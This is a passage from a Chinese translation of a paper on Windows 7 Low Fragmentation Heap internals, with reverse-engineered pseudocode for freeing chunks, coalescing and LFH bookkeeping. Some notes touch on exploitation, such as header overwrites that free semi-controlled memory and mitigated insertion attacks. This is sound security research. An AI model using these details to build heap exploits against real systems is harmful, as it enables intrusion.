class="comment">//BlocksIndex链表的下一个条目</span></span><br><span class="line">    BlocksIndex = BlocksIndex‐&gt;ExtendedLookup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：搜索ListHint索引并返回的过程从现在开始将视为BlocksIndexSearch()。它将使用_HEAP_LIST_LOOKUP和ChunkSize作为输入。它将遍历链表，更新BlocksIndex参数，直到找到候选者为止，最后返回FreeListIndex。</p></blockquote><p>&emsp;&emsp;现在_HEAP_LIST_LOOKUP已经找到了，该函数可以尝试使用特定的ListHint了。ListHint可以是一个特定的值，比如ListHints[0x6]，或者，如果待释放的Chunk的大小大于该BlocksIndex管理的额度，它就会被释放到ListHints[BlocksIndex-&gt;ArraySize-BaseIndex-1]。(类似于以前的FreeList[0]链表)</p><p style="text-align:center;font-weight:bold">Listing 26. RtlpFreeHeap ListHint retrieval</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//attempt to locate a freelist</span></span><br><span class="line"><span class="comment">//试图定位freelist</span></span><br><span class="line">_LIST_ENTRY *ListHint = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if the chunk can be managed by specific BlocksIndex</span></span><br><span class="line"><span class="comment">//如果Chunk可以由特定BlocksIndex来管理</span></span><br><span class="line"><span class="keyword">if</span>(ChunkSize &lt; (BlocksIndex‐&gt;ArraySize ‐ <span class="number">1</span>) ||</span><br><span class="line">    BlocksIndex‐&gt;ExtendedLookup != <span class="number">0x0</span> &amp;&amp;</span><br><span class="line">    ChunkSize == (BlocksIndex‐&gt;ArraySize ‐ <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//get the offset into the ListHints</span></span><br><span class="line">    <span class="comment">//获取ListHints的Offset</span></span><br><span class="line">    <span class="keyword">int</span> BaseIndex = BlocksIndex‐&gt;BaseIndex;</span><br><span class="line">    <span class="keyword">int</span> FreeListIndex = RelativeSize(BlocksIndex, ChunkSize ‐ BaseIndex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//acquire a freelist</span></span><br><span class="line">    <span class="comment">//获得一个freelist</span></span><br><span class="line">    ListHint = BlocksIndex‐&gt;ListHints[FreeListIndex];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如果ListHint已经被找到，并且blink不包含HeapBucket，那么后端堆管理器就会更新LFH启发式策略所用的值。由于一个Chunk被放回堆上，它会从计数器中减去0x2。这实际上意味着想要对给定的Bucket激活LFH，至少要进行0x11次连续分配。</p><p>&emsp;&emsp;例如，如果Bucket[0x6]收到0x10个请求，此后那些Chunks中的0x2个释放回堆，接着再进行0x2次同样大小的分配，LFH对Bucket[0x6]来说不会启用。在激活启发式方法将执行堆维护之前，必须满足该阈值。</p><p style="text-align:center;font-weight:bold">Listing 27. RtlpFreeHeap LFH counter decrement</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ListHint != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> FreeListBlink = ListHint‐&gt;Blink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the blink is not populated with a HeapBucket</span></span><br><span class="line">    <span class="comment">//decrement the counter, as we just freed a chunk</span></span><br><span class="line">    <span class="comment">//如果blink没有用HeapBucket填充</span></span><br><span class="line">    <span class="comment">//递减计数器，因为我们释放了一个Chunk</span></span><br><span class="line">    <span class="keyword">if</span>( !(BYTE)FreeListBlink &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(FreeListBlink &gt;= <span class="number">2</span>)</span><br><span class="line">            ListHint‐&gt;Blink = FreeListBlink ‐ <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在更新了用于LFH激活的计数器后，如果堆允许的话，RtlpFreeHeap()将试图合并Chunk。Chunk合并是一个非常重要的过程，在这个过程中，堆将查看与被释放的Chunk相邻的两个Chunk。这是为了避免有太多的小的空闲Chunks挨在一起(LFH直接解决了这个问题)。尽管RtlpCoalesceFreeBlocks()总是被调用，但Chunk合并仅仅只在被释放的Chunk的相邻Chunk的状态为Free时才会发生。</p><p>&emsp;&emsp;一旦相邻块的合并完成，将会继续检查合并后产生的新Chunk的大小，以保证其不超过Heap-&gt;DeCommitThreshold，也要确保它不需要由virtual memory来处理。最后，该算法片段将标记Chunk为FREE态，并且使UnusedBytes为0。</p><p style="text-align:center;font-weight:bold">Listing 28. RtlpFreeHeap Chunk coalescing and header reassignment</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unless the heap says otherwise, coalesce the adjacent free blocks</span></span><br><span class="line"><span class="comment">//除非特定情形，堆将合并毗邻的free blocks</span></span><br><span class="line"><span class="keyword">int</span> ChunkSize = ChunkHeader‐&gt;Size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !(Heap‐&gt;Flags &amp; <span class="number">0x80</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//combine the adjacent blocks</span></span><br><span class="line">    <span class="comment">//合并毗邻blocks</span></span><br><span class="line">    ChunkHeader = RtlpCoalesceFreeBlocks(Heap, ChunkHeader, &amp;ChunkSize, <span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//reassign the ChunkSize if neccessary</span></span><br><span class="line"><span class="comment">//如果有必要，重置ChunkSize</span></span><br><span class="line">ChunkSize = ChunkHeader‐&gt;Size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if the coalesced chunk is bigger than the decommit threshold for this heap, decommit the memory</span></span><br><span class="line"><span class="comment">//如果合并后的Chunk大于该堆的decommit阈值，就decommit该内存</span></span><br><span class="line"><span class="keyword">if</span>(ChunkHeader‐&gt;Size &gt; DeCommitThreshold</span><br><span class="line">    || ChunkHeader‐&gt;Size + TotalFreeBlocks &gt; DeCommitThreshold)</span><br><span class="line">&#123;</span><br><span class="line">    RtlpDeCommitFreeBlock(Heap, ChunkHeader, ChunkSize, <span class="number">0x0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VirtualMemoryThreshold=0xFE00</span></span><br><span class="line"><span class="keyword">if</span>(ChunkSize &gt; <span class="number">0xFE00</span>)</span><br><span class="line">&#123;</span><br><span class="line">    RtlpInsertFreeBlock(Heap, ChunkHeader, ChunkSize);</span><br><span class="line">    UpdateTagEntry(ChunkHeader);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mark the chunk as FREE</span></span><br><span class="line"><span class="comment">//标记该Chunk为FREE</span></span><br><span class="line">ChunkToFreeHeader‐&gt;Flags = <span class="number">0x0</span>;</span><br><span class="line">ChunkToFreeHeader‐&gt;UnusedBytes = <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;一个空闲Chunk必须被放置在FreeLists上特定的位置，或者至少放在FreeList[0]风格的结构ListHints[ArraySize-BaseIndex-1]中。该过程的第一步就是遍历_HEAP_LIST_LOOKUP来找到一个插入点。此后它会进一步遍历ListHead，如果你还记得的话，它与Heap-&gt;FreeLists是相同的指针。该指针以最小的空闲Chunk开始，并向上链接到最大的空闲Chunk。</p><p>&emsp;&emsp;循环被用来迭代此堆上可用的所有_HEAP_LIST_LOOKUP结构。该算法会获取ListHead并做一些初始验证。首先检查链表是否为空，如果是的话，循环会终止，执行流继续。其次要确保待释放的Chunk与该链表匹配。它将通过比较链表的最后一项(ListHead-&gt;Blink)的大小是否大于待释放Chunk的大小，来实现此目的。</p><p>&emsp;&emsp;最后，它会检查ListHead的第一个条目来判断它是否可以在此前插入。如果不行的话，FreeLists将被遍历以找到新的释放的Chunk可以被链入的位置，从FreeListIndex位置开始。(请参考图3中有关FreeLists的信息。)你现在可以看到为什么这些条目被归类为ListHints，这是因为它们实际上并不是那种以指向哨兵节点而终止的专门的链表(旧的FreeLists)，相反，它们是指向整个FreeLists中某个位置的指针。</p><p style="text-align:center;font-weight:bold">Listing 29. RtlpFreeHeap Insertion point search</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//FreeList will determine where, if anywhere there is space</span></span><br><span class="line"><span class="comment">//FreeList将确定在哪里有空间</span></span><br><span class="line">BlocksIndex = Heap‐&gt;BlocksIndex;</span><br><span class="line">_LIST_ENTRY *InsertList = Heap‐&gt;FreeLists;</span><br><span class="line"></span><br><span class="line"><span class="comment">//attempt to find where to insert this item on the ListHead list for a particular BlocksIndex</span></span><br><span class="line"><span class="comment">//试图在特定BlocksIndex的ListHead链表中找到插入该条目的位置</span></span><br><span class="line"><span class="keyword">if</span>(BlocksIndex)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//find a BlocksIndex for storage</span></span><br><span class="line">    <span class="comment">//查找用于存储的BlocksIndex</span></span><br><span class="line">    <span class="keyword">int</span> FreeListIndex = BlocksIndexSearch(BlocksIndex, ChunkSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(BlocksIndex != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _HEAP_ENTRY *ListHead = BlocksIndex‐&gt;ListHead;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if the ListHead is empty,our insert list will be the sentinel node</span></span><br><span class="line">        <span class="comment">//如果ListHead为空,我们的插入链表的位置就是哨兵节点</span></span><br><span class="line">        <span class="keyword">if</span>(ListHead == ListHead‐&gt;Blink)</span><br><span class="line">        &#123;</span><br><span class="line">            InsertList = ListHead;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if the chunk is larger than the largest entry, we'll insert it after</span></span><br><span class="line">        <span class="comment">//如果Chunk大于最大的条目，就插入到最大条目的后面</span></span><br><span class="line">        <span class="keyword">if</span>(ChunkSize &gt; ListHead‐&gt;Blink.Size)</span><br><span class="line">        &#123;</span><br><span class="line">            InsertList = ListHead;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pick the insertion point behind the 1st chunk larger than the ChunkToFree</span></span><br><span class="line">        <span class="comment">//找到第一个大于ChunkToFree的Chunk位置，选择其为插入点</span></span><br><span class="line">        _LIST_ENTRY *NextChunk = ListHead‐&gt;Flink;</span><br><span class="line">        <span class="keyword">if</span>(NextChunk.Size &gt; ChunkSize)</span><br><span class="line">        &#123;</span><br><span class="line">            InsertList = NextChunk;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NextChunk = BlocksIndex‐&gt;ListHints[FreeListIndex];</span><br><span class="line">        <span class="keyword">while</span>(NextChunk != ListHead)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//there is actually some decoding done here</span></span><br><span class="line">            <span class="comment">//实际上是一些解码操作</span></span><br><span class="line">            <span class="keyword">if</span>(NextChunk.Size &gt; ChunkSize)</span><br><span class="line">            &#123;</span><br><span class="line">                InsertList = NextChunk;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            NextChunk = NextChunk‐&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if we've found an insertion spot terminate the loop</span></span><br><span class="line">        <span class="comment">//如果找到了插入点，就终止循环</span></span><br><span class="line">        <span class="keyword">if</span>(InsertList != Heap‐&gt;FreeLists)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        BlocksIndex = BlocksIndex‐&gt;ExtendedLookup;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：为了简洁，Chunk头的解码以获取大小的代码没有列出。请不要误以为它是无需解引用的未编码头。</p></blockquote><p>&emsp;&emsp;当插入位置被精准地锁定后，RtlpFreeHeap()将确保Chunk被链入到了合适的位置。一旦找到了Chunk插入的最终位置，就将其安全的链入到FreeList。据我所知，此功能是新增功能，它可以直接解决Brett Moore的插入攻击(Moore 2005)。最后，该Chunk被放置在合适的FreeList上， ListsInUseUlong也相应更新。</p><p style="text-align:center;font-weight:bold">Listing 30. Safe link-in</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(InsertList != Heap‐&gt;FreeLists)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(InsertList.Size &gt; ChunkSize)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    InsertList = InsertList‐&gt;Flink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//R.I.P FreeList Insertion Attack</span></span><br><span class="line"><span class="comment">//R.I.P FreeList插入攻击</span></span><br><span class="line"><span class="keyword">if</span>(InsertList‐&gt;Blink‐&gt;Flink == InsertList)</span><br><span class="line">&#123;</span><br><span class="line">    ChunkToFree‐&gt;Flink = InsertList;</span><br><span class="line">    ChunkToFree‐&gt;Blink = InsertList‐&gt;Blink;</span><br><span class="line">    InsertList‐&gt;Blink‐&gt;Flink = ChunkToFree;</span><br><span class="line">    InsertList‐&gt;Blink = ChunkToFree;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    RtlpLogHeapFailure();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BlocksIndex = Heap‐&gt;BlocksIndex;</span><br><span class="line"><span class="keyword">if</span>(BlocksIndex)</span><br><span class="line">&#123;</span><br><span class="line">    FreeListIndex = BlocksIndexSearch(BlocksIndex, ChunkSize);</span><br><span class="line">    <span class="keyword">int</span> RelSize = ChunkSize ‐ BlocksIndex‐&gt;BaseIndex;</span><br><span class="line">    FreeListIndex = RelativeSize(BlocksIndex, RelSize);</span><br><span class="line">    _LIST_ENTRY *FreeListToUse = BlocksIndex‐&gt;ListHints[FreeListIndex];</span><br><span class="line">    <span class="keyword">if</span>(ChunkSize &gt;= FreeListToUse.Size)</span><br><span class="line">    &#123;</span><br><span class="line">        BlocksIndex‐&gt;ListHints[FreeListIndex] = ChunkToFree;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//bitwise OR instead of the XP XOR (R.I.P Bitmap flipping (hi nico))</span></span><br><span class="line">    <span class="comment">//按位或操作取代了XP时代的异或</span></span><br><span class="line">    <span class="keyword">if</span>(!FreeListToUse)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> UlongIndex = Chunkize ‐ BlocksIndex‐&gt;BaseIndex &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> Shifter = ChunkSize ‐ BlocksIndex‐&gt;BaseIndex &amp; <span class="number">1F</span>;</span><br><span class="line">        BlocksIndex‐&gt;ListsInUseUlong[UlongIndex] |= <span class="number">1</span> &lt;&lt; Shifter;</span><br><span class="line">    &#125;</span><br><span class="line">    EncodeHeader(ChunkHeader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：注意到ListInUseUlong用了一个按位OR操作，而不是此前所用的XOR操作。这确保了被填充的链表总是被标记为被填充态，而空的链表不可能被标记为填充态。<br><br>提示：如果RtlpLogHeapFailure()没有终止执行流将发生什么？(Flink/Blink将永远不会更新。。。)</p></blockquote><h4 id="Overview-概览-3"><a href="#Overview-概览-3" class="headerlink" title="Overview(概览)"></a>Overview(概览)</h4><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/RtlpFreeHeap_overview.png" alt="RtlpFreeHeap overview"></p><p style="text-align:center;font-weight:bold">Diagram 9. RtlpFreeHeap overview</p><h3 id="Front-end-Freeing-前端释放器"><a href="#Front-end-Freeing-前端释放器" class="headerlink" title="Front-end Freeing(前端释放器)"></a>Front-end Freeing(前端释放器)</h3><p>&emsp;&emsp;前端分配由LFH处理。虽然它没有被首先使用，但是一旦触发了某种启发式操作，它便是唯一使用的堆管理器。设计LFH是为了避免内存碎片并支持频繁的使用特定大小的内存，它与旧的前端管理器Lookaside链表完全不同，Lookaside是通过链表结构来维护小于1024字节的Chunks。尽管BlocksIndex结构可以跟踪大小超过16k的Chunks，但LFH也仅仅为小于16k的Chunks服务。</p><h4 id="RtlpLowFragHeapFree"><a href="#RtlpLowFragHeapFree" class="headerlink" title="RtlpLowFragHeapFree"></a>RtlpLowFragHeapFree</h4><p>&emsp;&emsp;RtlpLowFragHeapFree()具有两个参数，一个_HEAP结构体和一个指向待释放的Chunk指针。该函数会首先检查在ChunkToFree的头中是否设置了某些flags。如果flags为0x5，则进行调整以更改头部的位置。此后它会找到相关联的SubSegment，SubSegment使得它可以访问内存跟踪时所有需要的成员。它也会重置头部的一些值来反映出其是一个最近释放的块。</p><p style="text-align:center;font-weight:bold">Listing 31. RtlpLowFragHeapFree Subsegment acquisition</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hi ben hawkes :)</span></span><br><span class="line">_HEAP_ENTRY *ChunkHeader = ChunkToFree ‐ <span class="keyword">sizeof</span>(_HEAP_ENTRY); </span><br><span class="line"><span class="keyword">if</span>(ChunkHeader‐&gt;UnusedBytes == <span class="number">0x5</span>)</span><br><span class="line">    ChunkHeader ‐= <span class="number">8</span> * (BYTE)ChunkHeader‐&gt;SegmentOffset;</span><br><span class="line"></span><br><span class="line">_HEAP_ENTRY *ChunkHeader_Saved = ChunkHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gets the subsegment based off the LFHKey, Heap and ChunkHeader</span></span><br><span class="line"><span class="comment">//根据LFHKey,Heap,ChunkHeader获得Subsegment</span></span><br><span class="line">_HEAP_SUBSEGMENT SubSegment = GetSubSegment(Heap, ChunkToFree);</span><br><span class="line">_HEAP_USERDATA_HEADER *UserBlocks = SubSegment‐&gt;UserBlocks;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set flags to 0x80 for LFH_FREE (offset 0x7)</span></span><br><span class="line"><span class="comment">//设置ExtendedBlockSignature为0x80,表示此由LFH管理的块的状态为Free</span></span><br><span class="line">ChunkHeader‐&gt;UnusedBytes = <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set SegmentOffset or LFHFlags (offset 0x6)</span></span><br><span class="line"><span class="comment">//设置SegmentOffset或LFHFlags</span></span><br><span class="line">ChunkHeader‐&gt;SegmentOffset = <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：Ben Hawkes解释了如何使用覆盖Chunk Header的方法来更改ChunkHeader指针，从而导致半控制的内存被释放。你可以选择至多(0x8*0xFF)大小的ChunkHeader内存地址空间。</p></blockquote><p>&emsp;&emsp;一个合适的Chunk Header被定位到以后，函数将需要计算出一个新的偏移。该偏移将用来写入到与SubSegment关联的UserBlock中。此时还需要做一些初始的检查来保证在实际释放Chunk前，Subsegment没有超过它的边界。如果这些情况不满足，就会设置一个值来标识SubSegment需要进一步的维护操作。</p><p>&emsp;&emsp;接下来，将尝试从SubSegment获取一个_INTERLOCK_SEQ，获取当前的Depth, Offset和Sequence。下一个Offset将通过该待释放Chunk的前向毗邻的Chunk来获取。正如我们在RtlpLowFragHeapAllocFromContext()中所看到的，它被存储在Chunks数据域的前2个字节处。Depth会递增1，这是因为一个Chunk刚刚被放回可用bin中。</p><p>&emsp;&emsp;新值与旧值将进行原子交换，成功则跳出循环，失败则循环继续。这是LFH中大多数的典型操作，它被设计成用于高并发环境下工作。</p><p style="text-align:center;font-weight:bold">Listing 32. RtlpLowFragHeapFree OffsetAndDepth/Sequence update</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _INTERLOCK_SEQ AggrExchg;</span><br><span class="line">    AggrExchg.OffsetAndDepth = SubSegment‐&gt;AggregateExchg.OffsetAndDepth;</span><br><span class="line">    AggrExchg.Sequence = SubSegment‐&gt;AggregateExchg.Sequence;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> Sequence_New = AggrExchg.Sequence + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(AggrExchg.OffsetAndDepth &gt;= ‐<span class="number">1</span>)</span><br><span class="line">        Sequence_New‐‐;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> Depth = SubSegment‐&gt;AggrExchg.Depth;</span><br><span class="line">    _HEAP_LOCAL_SEGMENT_INFO *LocalSegmentInfo = SubSegment‐&gt;LocalInfo;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Sequence = SubSegment‐&gt;LocalInfo‐&gt;LocalData‐&gt;Sequence;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> LastOpSequence = LocalSegmentInfo‐&gt;LastOpSequence;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setup the new INTERLOCK_SEQ</span></span><br><span class="line">    <span class="comment">//设置新的INTERLOCK_SEQ</span></span><br><span class="line">    _INTERLOCK_SEQ AggrExchg_New;</span><br><span class="line">    AggrExchg_New.Sequence = Sequence_New;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Depth != SubSegment‐&gt;BlockCount</span><br><span class="line">        || LocalSegmentInfo‐&gt;Counters.SubSegmentCounts == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Sequence &gt;= LastOpSequence &amp;&amp; (Sequence ‐ LastOpSequence) &lt; <span class="number">0x20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//set the FreeEntryOffset of ChunkToFree</span></span><br><span class="line">            <span class="comment">//为ChunkToFree设置FreeEntryOffset</span></span><br><span class="line">            *(WORD)(ChunkHeader + <span class="number">8</span>) = AggrExchg.FreeEntryOffset;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Subtract the size of the block being freed from the current offset; </span></span><br><span class="line">            <span class="comment">//which will give you the next free chunk</span></span><br><span class="line">            <span class="comment">//从当前Offset扣除释放的block大小；得到下一个free chunk的Offset</span></span><br><span class="line">            <span class="keyword">int</span> NewOffset = AggrExchg.FreeEntryOffset ‐ (ChunkHeader ‐ UserBlocks) / <span class="number">8</span>;</span><br><span class="line">            AggrExchg_New.FreeEntryOffset = NewOffset;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//increase depth because we're freeing</span></span><br><span class="line">            <span class="comment">//递增Depth，因为我们释放了Chunk</span></span><br><span class="line">            AggrExchg_New.Depth = Depth + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//set the Hint in the subsegment</span></span><br><span class="line">            <span class="comment">//在Subsegment中设置Hint</span></span><br><span class="line">            Sequence = <span class="number">1</span>;</span><br><span class="line">            SubSegment‐&gt;LocalInfo‐&gt;Hint = SubSegment;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Sequence = <span class="number">3</span>;</span><br><span class="line">            AggrExchg_New.Depth = ‐<span class="number">1</span>; <span class="comment">//last entry</span></span><br><span class="line">            AggrExchg_New.FreeEntryOffset = <span class="number">0</span>; <span class="comment">//no offset</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Sequence = <span class="number">3</span>;</span><br><span class="line">        AggrExchg_New.Depth = ‐<span class="number">1</span>; <span class="comment">//last entry</span></span><br><span class="line">        AggrExchg_New.FreeEntryOffset = <span class="number">0</span>; <span class="comment">//no offset</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 